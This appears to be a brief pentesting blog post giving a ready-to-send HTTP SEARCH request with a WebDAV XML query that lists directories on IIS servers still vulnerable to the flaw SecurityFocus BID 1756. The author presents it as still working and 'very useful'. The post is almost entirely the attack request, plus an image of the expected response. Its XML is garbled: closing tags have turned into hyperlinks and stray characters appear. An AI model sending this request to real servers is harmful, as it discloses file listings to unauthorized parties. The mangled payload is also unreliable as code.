<div class="header">
  <h1>IIS Search Verb Directory Listing</h1>
  <h2></h2>
</div>
<div class="content">
  <p>This: <a href="http://www.securityfocus.com/bid/1756">http://www.securityfocus.com/bid/1756</a> still works (<em>on vulnerable hosts, this is an old vuln</em>) and is very useful:</p>

<p>Send this:</p>

<blockquote>
<p>SEARCH / HTTP/1.1<br />
Host: target<br />
Content-Type: text/xml<br />
Content-Length: 133</p>
</blockquote>

<p>&lt;?xml version=&ldquo;1.0&rdquo;?&gt;<br />
<g:searchrequest xmlns:g="DAV:"><br />
<g:sql><br />
Select &ldquo;DAV:displayname&rdquo; from scope()<br />
<a href="/g:sql">/g:sql</a><br />
<a href="/g:searchrequest">/g:searchrequest</a>
&gt;
&gt;</p>

<p>And expect something like this back:</p>

<p><img src="http://mubix.files.wordpress.com/2011/08/iis_search_trick.png" alt="" /></p>

</div>
